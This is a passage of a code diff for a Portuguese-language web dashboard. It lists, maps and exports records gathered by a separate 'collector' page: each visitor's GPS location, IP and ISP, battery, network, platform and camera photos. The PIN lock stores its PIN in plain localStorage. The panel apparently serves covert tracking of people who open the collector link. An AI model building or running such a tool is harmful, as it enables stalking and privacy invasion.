+            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `relatorio_telemetria_${Date.now()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        });
+
+        exportCsvBtn.addEventListener('click', () => {
+            if (allData.length === 0) {
+                alert('Nenhum dado para exportar.');
+                return;
+            }
+
+            const headers = [
+                'ID', 'Sessao', 'Data_Hora', 'Latitude', 'Longitude', 'Precisao_Metros',
+                'IP', 'Cidade', 'Pais', 'Provedor', 'Bateria', 'Rede', 'Plataforma', 'Tem_Foto'
+            ];
+
+            const rows = allData.map(item => [
+                `"${item.id || ''}"`,
+                `"${item.sessionId || ''}"`,
+                `"${item.timestamp || ''}"`,
+                item.location ? item.location.latitude : '',
+                item.location ? item.location.longitude : '',
+                item.location ? item.location.accuracy : '',
+                `"${item.telemetry?.ipInfo?.ip || ''}"`,
+                `"${item.telemetry?.ipInfo?.city || ''}"`,
+                `"${item.telemetry?.ipInfo?.country || ''}"`,
+                `"${item.telemetry?.ipInfo?.org || ''}"`,
+                item.telemetry?.battery ? item.telemetry.battery.level + '%' : '',
+                `"${item.telemetry?.network?.effectiveType || ''}"`,
+                `"${item.telemetry?.device?.platform || ''}"`,
+                item.camera?.photo ? 'SIM' : 'NAO'
+            ]);
+
+            const csvContent = '\uFEFF' + [headers.join(';'), ...rows.map(e => e.join(';'))].join('\n');
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `relatorio_telemetria_${Date.now()}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+        });
+
+        // 8. Segurança: Controle por PIN
+        let currentPin = localStorage.getItem('panelPin') || '';
+
+        function updateLockBtnLabel() {
+            if (currentPin) {
+                lockBtnLabel.textContent = 'Bloquear / Trocar PIN';
+                lockToggleBtn.classList.remove('btn-secondary');
+                lockToggleBtn.classList.add('btn-primary');
+            } else {
+                lockBtnLabel.textContent = 'Proteger com PIN';
+                lockToggleBtn.classList.add('btn-secondary');
+                lockToggleBtn.classList.remove('btn-primary');
+            }
+        }
+        updateLockBtnLabel();
+
+        lockToggleBtn.addEventListener('click', () => {
+            if (!currentPin) {
+                const newPin = prompt('Defina um PIN de 4 a 8 dígitos para bloquear o painel:');
+                if (newPin && newPin.trim().length >= 4) {
+                    currentPin = newPin.trim();
+                    localStorage.setItem('panelPin', currentPin);
+                    updateLockBtnLabel();
+                    alert('PIN configurado com sucesso! O painel será bloqueado agora.');
+                    lockScreen.classList.remove('hidden');
+                }
+            } else {
+                const action = confirm('O painel já possui PIN. Clique em OK para Bloquear Imediatamente, ou Cancelar para Remover o PIN.');
+                if (action) {
+                    lockScreen.classList.remove('hidden');
+                } else {
+                    const check = prompt('Digite o PIN atual para removê-lo:');
+                    if (check === currentPin) {
+                        localStorage.removeItem('panelPin');
+                        currentPin = '';
+                        updateLockBtnLabel();
+                        alert('PIN removido.');
+                    } else {
+                        alert('PIN incorreto!');
+                    }
+                }
+            }
+        });
+
+        unlockBtn.addEventListener('click', () => {
+            if (pinInput.value === currentPin) {
+                lockScreen.classList.add('hidden');
+                pinError.classList.add('hidden');
+                pinInput.value = '';
+            } else {
+                pinError.classList.remove('hidden');
+            }
+        });
+
+        pinInput.addEventListener('keyup', (e) => {
+            if (e.key === 'Enter') unlockBtn.click();
+        });
+
+        // Se tiver PIN salvo, inicia bloqueado
+        if (currentPin) {
+            lockScreen.classList.remove('hidden');
+        }
+
+        // 9. Event Listeners Gerais
+        searchInput.addEventListener('input', renderFilteredList);
+        typeFilter.addEventListener('change', renderFilteredList);
+
+        refreshBtn.addEventListener('click', () => {
+            loadData();
+            refreshBtn.innerHTML = '<i class="fas fa-check"></i> Atualizado!';
+            setTimeout(() => refreshBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Atualizar', 1200);
+        });
+
+        clearBtn.addEventListener('click', async () => {
+            if (confirm('Tem certeza de que deseja apagar todo o histórico de coletas?')) {
+                localStorage.removeItem('panelData');
+                allData = [];
+                try {
+                    await fetch('/api/data', { method: 'DELETE' });
+                } catch (e) {}
+                renderAll();
+            }
+        });
+
+        openCollectorBtn.addEventListener('click', () => window.open('coletor.html', '_blank'));
+        centerMapBtn.addEventListener('click', () => {
+            updateMapPoints(allData);
+            if (map) map.invalidateSize();
+        });
+
+        // 10. Auto-refresh a cada 5s quando a janela estiver ativa
+        function startAutoRefresh() {
+            if (!autoRefreshInterval) {
+                autoRefreshInterval = setInterval(loadData, 5000);
+            }
+        }
+
+        function stopAutoRefresh() {
+            if (autoRefreshInterval) {
+                clearInterval(autoRefreshInterval);
+                autoRefreshInterval = null;
+            }
+        }
+
+        window.addEventListener('focus', () => { loadData(); startAutoRefresh(); });
+        window.addEventListener('blur', stopAutoRefresh);
+
+        // Inicializar
+        loadData();
+        startAutoRefresh();
+    </script>
+</body>
+</html>
